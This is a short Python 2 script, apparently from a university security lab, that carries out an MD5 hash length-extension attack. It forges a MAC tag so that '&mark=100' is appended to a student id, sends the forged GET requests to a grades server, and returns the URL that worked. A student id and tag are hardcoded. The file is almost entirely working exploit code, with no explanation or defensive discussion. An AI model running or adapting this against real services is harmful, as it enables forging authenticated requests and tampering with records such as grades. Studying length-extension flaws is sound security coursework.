import httplib, urlparse, urllib
from md5p import md5, padding

###############
### attack ####
###############

#note that urllib has a function quote() which encodes non-ASCII characters

def attack(url, tag, sid, mark):

    extension = "&sid=" + sid + "&mark=" + mark
 
    # parameter url is the attack url you construct
    parsedURL = urlparse.urlparse(url)

    # open a connection to the server
    httpconn = httplib.HTTPConnection(parsedURL.hostname, parsedURL.port)

    h = md5(state=tag.decode("hex"), count=512)
    h.update(extension)


    for i in range(8, 21):

        sid2 = sid + urllib.quote(padding((len(sid) + 4 + i)*8)) + extension

        query = parsedURL.path + "?tag=" + h.hexdigest() + "&sid=" + sid2; 

        # issue server-API request
        httpconn.request("GET", query)

        # httpresp is response object containing a status value and possible message
        httpresp = httpconn.getresponse()

        # valid request will result in httpresp.status value 200
#        print httpresp.status
        httpresp.status

        # in the case of a valid request, print the server's message
#        print httpresp.read()
        httpresp.read()


    # return the url that made the attack successful 
    return(query)


#############
### main ####
#############

if __name__ == "__main__":
    url = "http://grades.cms-weblab.utsc.utoronto.ca/"
#    tag = "3f1de1c1fd83263f159f6dc284fd51b4"
#    sid = "0000000001"
    tag = "fe97463cddd712e2fcc3897cd490f4ce"
    sid = "1000867788"
    mark = "100"
    
    print(attack(url, tag, sid, mark))
